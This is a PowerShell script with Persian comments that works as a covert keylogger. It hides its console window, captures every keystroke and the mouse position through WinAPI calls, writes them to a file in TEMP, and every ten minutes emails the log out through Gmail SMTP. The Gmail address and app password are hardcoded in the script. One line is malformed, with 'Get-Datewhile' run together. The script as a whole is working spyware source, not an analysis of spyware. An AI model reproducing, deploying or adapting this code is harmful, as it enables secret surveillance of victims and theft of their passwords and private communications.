# ابتدا پنجره PowerShell را مخفی کنیم
try {
    $windowCode = @'
    using System;
    using System.Runtime.InteropServices;
    public class Window {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static void Hide() {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
        }
    }
'@
    Add-Type -TypeDefinition $windowCode -Language CSharp
    [Window]::Hide()
} catch {
    "Error hiding window: $($_.Exception.Message)" | Out-File "$env:TEMP\script_errors.log" -Append
}

# تنظیمات اصلی
$LogPath = "$env:TEMP\SystemLog.txt"
$Interval = 600
$GmailUser = "lalqalandar310@gmail.com"
$GmailPass = "fmwh vght myzb xcgp"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = 587

# ثبت کلیدهای فشرده شده با استفاده از WinAPI
$Signature = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern bool GetCursorPos(ref System.Drawing.Point pt);
'@

Add-Type -MemberDefinition $Signature -Name Win32 -Namespace Api

# تابع برای تبدیل کد مجازی به نام کلید
function Get-KeyName {
    param($keyCode)
    $keyMap = @{
        8 = "[Backspace]"; 9 = "[Tab]"; 13 = "[Enter]"; 32 = "[Space]"; 
        27 = "[Escape]"; 37 = "[Left]"; 38 = "[Up]"; 39 = "[Right]"; 40 = "[Down]";
        46 = "[Delete]"; 91 = "[Win]"; 112 = "[F1]"; 113 = "[F2]"; 114 = "[F3]"; 
        115 = "[F4]"; 116 = "[F5]"; 117 = "[F6]"; 118 = "[F7]"; 119 = "[F8]"; 
        120 = "[F9]"; 121 = "[F10]"; 122 = "[F11]"; 123 = "[F12]"; 162 = "[Ctrl]"; 
        163 = "[RightCtrl]"; 164 = "[Alt]"; 165 = "[RightAlt]"; 186 = ";"; 187 = "="; 
        188 = ","; 189 = "-"; 190 = "."; 191 = "/"; 192 = "`"; 219 = "["; 220 = "\\"; 
        221 = "]"; 222 = "'"
    }
    
    if ($keyMap.ContainsKey($keyCode)) {
        return $keyMap[$keyCode]
    } elseif ($keyCode -ge 65 -and $keyCode -le 90) {
        $isCapsLock = [Console]::CapsLock
        $isShiftPressed = [Win32]::GetAsyncKeyState(16) -ne 0
        
        if (($isCapsLock -and -not $isShiftPressed) -or (-not $isCapsLock -and $isShiftPressed)) {
            return [char]$keyCode
        } else {
            return [char]::ToLower([char]$keyCode)
        }
    } elseif ($keyCode -ge 48 -and $keyCode -le 57) {
        $shiftChars = @(")", "!", "@", "#", "$", "%", "^", "&", "*", "(")
        $isShiftPressed = [Win32]::GetAsyncKeyState(16) -ne 0
        
        if ($isShiftPressed) {
            return $shiftChars[$keyCode - 48]
        } else {
            return [char]$keyCode
        }
    } else {
        return "[Key$keyCode]"
    }
}

# تابع برای ارسال ایمیل
function Send-EmailReport {
    param($BodyContent)
    try {
        $secPass = ConvertTo-SecureString $GmailPass -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential ($GmailUser, $secPass)
        
        $emailParams = @{
            From = $GmailUser
            To = $GmailUser
            Subject = "Activity Report $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
            Body = $BodyContent
            SmtpServer = $SMTPServer
            Port = $SMTPPort
            UseSsl = $true
            Credential = $cred
            ErrorAction = 'Stop'
        }
        
        Send-MailMessage @emailParams
        "Email sent successfully at $(Get-Date)" | Out-File "$env:TEMP\email_status.log" -Append
        return $true
    } catch {
        $errorMsg = $_.Exception.Message
        "Email failed at $(Get-Date): $errorMsg" | Out-File "$env:TEMP\email_errors.log" -Append
        return $false
    }
}

# حلقه اصلی برای ثبت فعالیت‌ها
while ($true) {
    $logEntries = @()
    $startTime = Get-Datewhile ((Get-Date) - $startTime -lt (New-TimeSpan -Seconds $Interval)) {
        # ثبت موقعیت ماوس
        $point = New-Object System.Drawing.Point
        try {
            if ([Api.Win32]::GetCursorPos([ref]$point)) {
                $mousePos = "Mouse: X=$($point.X), Y=$($point.Y)"
            }
        } catch {
            $mousePos = "Mouse: Error getting position"
        }

        # بررسی کلیدهای فشرده شده
        for ($i = 1; $i -le 254; $i++) {
            try {
                $state = [Api.Win32]::GetAsyncKeyState($i)
                if ($state -eq -32767) {
                    $keyName = Get-KeyName $i
                    $timeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    $logEntry = "[$timeStamp] Key: $keyName | $mousePos"
                    $logEntries += $logEntry
                    
                    # ذخیره موقت در فایل
                    $logEntry | Out-File $LogPath -Append
                }
            } catch {
                # خطا در ثبت کلید
            }
        }
        Start-Sleep -Milliseconds 10
    }

    # ارسال ایمیل اگر فعالیتی ثبت شده باشد
    if ($logEntries.Count -gt 0) {
        $body = $logEntries -join "`n"
        $emailSent = Send-EmailReport $body
        
        if (-not $emailSent) {
            # ذخیره لاگ به صورت محلی اگر ایمیل ارسال نشد
            $backupFile = "$env:TEMP\activity_backup_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
            $body | Out-File $backupFile
        }
    }
}